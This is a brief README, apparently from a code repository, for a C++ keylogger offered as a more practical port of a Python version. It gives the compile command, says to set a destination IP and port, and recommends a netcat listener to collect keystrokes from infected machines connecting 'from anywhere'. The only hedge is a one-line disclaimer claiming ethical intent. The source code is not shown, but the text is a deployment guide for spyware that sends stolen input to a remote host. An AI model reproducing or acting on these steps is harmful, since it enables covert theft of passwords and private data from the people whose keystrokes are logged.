# C++ keylogger
A copy of https://github.com/IVBecy/keylogger in C++, only that this is a bit more practical
compared to the Python script.  
**This is for ethical and demonstration purposes only**

# Compile with:
`g++ logger.cpp -lws2_32 -o [output_file]`

# How does it work?
- Change destination IP and port in `logger.cpp`
- Compile `logger.cpp`
- You can use netcat as a server: `nc -lvnp [port]` 
- Start the server, and have the client connect to it from anywhere... 